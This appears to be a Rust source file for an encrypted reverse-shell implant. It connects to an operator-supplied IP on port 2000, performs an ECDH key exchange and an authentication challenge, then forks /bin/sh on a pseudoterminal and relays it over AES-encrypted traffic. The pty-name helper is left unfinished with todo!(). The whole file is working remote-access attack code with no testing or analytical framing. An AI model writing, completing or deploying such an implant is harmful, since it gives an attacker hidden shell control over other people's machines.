#![cfg_attr(not(test), no_main)]
#![feature(trait_alias)]
#![feature(int_roundings)]
#![feature(int_log)]

extern crate libc;
mod auxv;
mod kex;
mod relay;
pub mod util;

#[allow(unused_imports)]
use aes_gcm::{Aes256Gcm, Key, Nonce};
#[allow(unused_imports)]
use anyhow::{anyhow, Result};
use auxv::getauxval;
use base64ct::{Base64, Encoding};
use kex::{play_auth_challenge_remote, play_dh_kex_remote};
use p256::PublicKey;
use rand_chacha::ChaCha20Rng;
use rand_core::SeedableRng;
use relay::{relay, RelayNode};
use std::ffi::{c_char, c_int, CStr};
use std::io;
use std::mem::MaybeUninit;
use std::net::{Ipv4Addr, SocketAddr, TcpStream};
use std::os::unix::io::AsRawFd;
use std::os::unix::prelude::RawFd;
use std::ptr;
use thiserror::Error;
use util::debug;

const LOCAL_PORT: u16 = 2000;

fn get_rand_seed(rand_ptr: *const u64) -> Option<u64> {
	if 0 != rand_ptr as usize {
		// Assuming everything worked out correctly, this dereference
		// should be fine
		debug!("deref rand bytes at: {:#016x}", rand_ptr as usize);
		let result = unsafe { *(rand_ptr) };
		debug!("= {:#016x}", result);
		Some(result)
	} else {
		// getauxval(AT_RANDOM) is not available, use /dev/urandom
		None
	}
}

// The ecdh library expects the PEM in a certain format
//  use this function to convert from straight b64 to
//  the expected format.
fn format_public_key(b64_sec1: &str) -> ([u8; 1024], usize) {
	let mut rebuilt = [0u8; 1024];
	let size = {
		let s = Base64::decode(b64_sec1, &mut rebuilt).unwrap();
		s.len()
	};
	(rebuilt, size)
}

// This struct implementation duplicates nix's pty struct
// implementation. It's a very thin layer around a RawFd, but makes
// certain that you can read to and write from it.
#[derive(Debug, Eq, Hash, PartialEq)]
pub struct PtyMaster(RawFd);

impl io::Read for PtyMaster {
	fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
		let res = unsafe {
			libc::read(
				self.0,
				buf.as_mut_ptr() as *mut libc::c_void,
				buf.len() as libc::size_t,
			)
		};

		if res == -1 {
			Err(io::Error::last_os_error())
		} else {
			Ok(res as usize)
		}
	}
}

impl io::Write for PtyMaster {
	fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
		let res = unsafe {
			libc::write(
				self.0,
				buf.as_ptr() as *const libc::c_void,
				buf.len() as libc::size_t,
			)
		};

		if res == -1 {
			Err(io::Error::last_os_error())
		} else {
			Ok(res as usize)
		}
	}

	fn flush(&mut self) -> io::Result<()> {
		Ok(())
	}
}

impl AsRawFd for PtyMaster {
	fn as_raw_fd(&self) -> RawFd {
		self.0
	}
}

// Use this error to wrap the snprintf potential problems
#[derive(Error, Debug)]
enum PTYNameError {
	#[error("Unable to cast to desired type.")]
	Cast,
	#[error("Unable to ioctl the PTY number.")]
	TIOCGPTN,
}

// Special purpose snprintf for determining the PTY name
fn pty_snprintf(
	dst: *mut u8,
	size: usize,
	i: i32,
) -> Result<i32, PTYNameError> {
	let fmt_str = "/dev/pts/%d";
	// Reconstitute the dst array
	let dst_arr =
		unsafe { std::slice::from_raw_parts_mut(dst, size) };
	// Write in the /dev/pts/ part
	let mut written = size.min(fmt_str.len() - 2);
	dst_arr[0..written]
		.copy_from_slice(fmt_str[..written].as_bytes());
	// Determine how many digits it's going to take
	let digits = (i.ilog10() + 1) as usize;
	// Determine how much of that we can print
	let remaining = size.saturating_sub(written);
	let mut cur = i;
	// Go through, most significant to least
	for idx in (digits.saturating_sub(remaining)..digits).rev() {
		// Create the base-10 mask for the current position
		let denominator = 10i32.pow(idx as u32);
		// Divide out the highest position
		let ms_digit = cur.div_floor(denominator);
		// Update cur to no longer have the current position
		cur = cur % denominator;
		// Write it to the dst in ascii ('0' = 0x30)
		dst_arr[written] = (0x30 + ms_digit)
			.try_into()
			.or(Err(PTYNameError::Cast))?;
		written += 1;
	}
	// Finish it with a null terminator
	if written < size {
		dst_arr[written] = 0;
	}
	// Return how many bytes were filled
	written.try_into().or(Err(PTYNameError::Cast))
}

// This function is supposed to mimic the real ptsname_r function
// without using any formatting functions. Most of the work is moving
// bytes around without creating any allocations.
fn no_printf_ptsname_r(
	fd: c_int,
	buf: *mut c_char,
	buflen: libc::size_t,
) -> Result<(), PTYNameError> {
	let ptsnum: c_int =
		unsafe { MaybeUninit::zeroed().assume_init() };
	if 0 != unsafe { libc::ioctl(fd, libc::TIOCGPTN, &ptsnum) } {
		return Err(PTYNameError::TIOCGPTN);
	}
	let name_buf: [c_char; 30] = Default::default();
	todo!()
}

#[cfg_attr(not(test), no_mangle)]
pub fn main(
	argc: i32,
	argv: *const *const c_char,
	envp: *const *const u8,
) -> i8 {
	// Check that we have the args
	if argc < 3 {
		return 1;
	}

	// Parse argv
	let argv_ptrs =
		unsafe { std::slice::from_raw_parts(argv, argc as usize) };
	let ip_str =
		unsafe { CStr::from_ptr(argv_ptrs[1]).to_str().unwrap() };
	let key_str =
		unsafe { CStr::from_ptr(argv_ptrs[2]).to_str().unwrap() };
	// Parse the IP
	let ipaddr_l: Ipv4Addr =
		ip_str.parse().expect("Failed to parse IP");
	// Parse the public key which should just be the base64 component
	//  on a single line
	let (rebuilt, rebuilt_sz) = format_public_key(&key_str);
	let pub_l = PublicKey::from_sec1_bytes(&rebuilt[..rebuilt_sz])
		.expect("Failed to parse public key");

	debug!(
		"Found local's key:\n{:?}\nAnd address: {:#}",
		pub_l, ipaddr_l,
	);

	// Seed the RNG
	// Prefer the auxiliary vector's random data entry for seeding
	let rand_ptr =
		getauxval(envp, libc::AT_RANDOM as usize) as *const u64;
	let seed1 = get_rand_seed(rand_ptr);

	// TODO: Register SIGALRM

	// Open the socket to remote
	let addr = SocketAddr::from((ipaddr_l, LOCAL_PORT));
	let mut remote =
		TcpStream::connect(addr).expect("Unable to connect.");
	// Get the shared AES key
	let key = play_dh_kex_remote(&mut remote, &pub_l, seed1)
		.expect("Failed KEX");

	// Create a new rng for the challenge and nonce values
	let mut rng = if let Some(seed2) =
		get_rand_seed(unsafe { rand_ptr.add(1) })
	{
		ChaCha20Rng::seed_from_u64(seed2)
	} else {
		debug!("Unable to use seeds, using /dev/urandom");
		ChaCha20Rng::from_entropy()
	};

	// Challenge the remote
	play_auth_challenge_remote(&mut remote, &pub_l, &mut rng)
		.expect("Failed challenge");

	// TODO: unregister SIGALRM

	// Get a master pseudoterminal file descriptor
	let master = unsafe { libc::posix_openpt(libc::O_RDWR) };
	if master < 0 {
		panic!("Unable to posix_openpt");
	}
	// Register a slave pseudoterminal to this master
	if 0 > unsafe { libc::grantpt(master) } {
		panic!("Unable to grantpt");
	}
	// Unlock the previously registered slave, allowing us to open it
	if 0 > unsafe { libc::unlockpt(master) } {
		panic!("Unable to unlockpt");
	}
	match unsafe { libc::fork() } {
		-1 => panic!("Unable to fork"),
		0 => {
			// Child:
			//  - create a new session and set the controlling
			//    terminal to be be the slave side of the pty. It's
			//    probably more portable to open() the name of the pty
			//    slave, since then we don't we have to mess around
			//    with ioctls. opening a pty will make it the
			//    controlling terminal.
			// Determine the slave psudoterminal name
			let mut slave_name: [c_char; 64] =
				unsafe { MaybeUninit::zeroed().assume_init() };
			no_printf_ptsname_r(master, slave_name.as_mut_ptr(), 64);
			// Open it
			let slave = unsafe {
				libc::open(slave_name.as_ptr(), libc::O_RDWR)
			};
			// Establish this pid as the process tree root
			if 0 > unsafe { libc::setsid() } {
				panic!("Unable to setsid");
			}
			// Set the slave as the controlling terminal to this pid
			if 0 > unsafe { libc::ioctl(slave, libc::TIOCSCTTY) } {
				panic!("Unable to ioctl TIOCSTTY");
			}
			//  - close fds (except the pty slave) get the max fd
			//    value
			let fdmax: i32 =
				unsafe { libc::sysconf(libc::_SC_OPEN_MAX) }
					.try_into()
					.unwrap_or(i16::MAX.into());
			//    close everything
			for fd in 0i32..fdmax {
				if fd != slave {
					unsafe { libc::close(fd) };
				}
			}
			//  - dup2
			for fd in 0i32..3 {
				if 0 > unsafe { libc::dup2(slave, fd) } {
					panic!("Unable to dup2");
				}
			}
			//  - setup /bin/sh command
			let sh = b"/bin/sh\0";
			let mut argv_ptr = [0 as *const c_char; 2];
			argv_ptr[0] = sh.as_ptr() as *const c_char;
			//  - exec
			unsafe {
				libc::execv(
					sh.as_ptr() as *const c_char,
					argv_ptr.as_ptr(),
				)
			};
		}
		_ => {
			// Set up handler for SIGCHLD. If the child shell exits,
			// gets stopped, etc., we want the remote to exit, thus
			// closing the connection to the client.
			unsafe {
				let mut sigset: libc::sigset_t =
					MaybeUninit::zeroed().assume_init();
				libc::sigemptyset(&mut sigset);
				let sigact = libc::sigaction {
					sa_sigaction: exit_on_sigchld as usize,
					sa_mask: sigset,
					sa_flags: 0,
					sa_restorer: None,
				};
				libc::sigaction(
					libc::SIGCHLD,
					&sigact,
					ptr::null_mut(),
				);
			}
			// Start up the relay
			let mut node1 = RelayNode {
				readable: PtyMaster(master),
				writeable: PtyMaster(master),
			};
			match relay(&mut node1, &mut remote, &key, &mut rng) {
				Ok(_) => {
					debug!("Remote finished relay");
					()
				}
				Err(e) => {
					debug!("Remote error: {:?}", e);
					()
				}
			}
		}
	};
	return 0;
}

fn exit_on_sigchld(
	_sig: c_int,
	_info: &mut libc::siginfo_t,
	_context: &mut libc::c_void,
) {
	unsafe {
		libc::exit(0);
	}
}
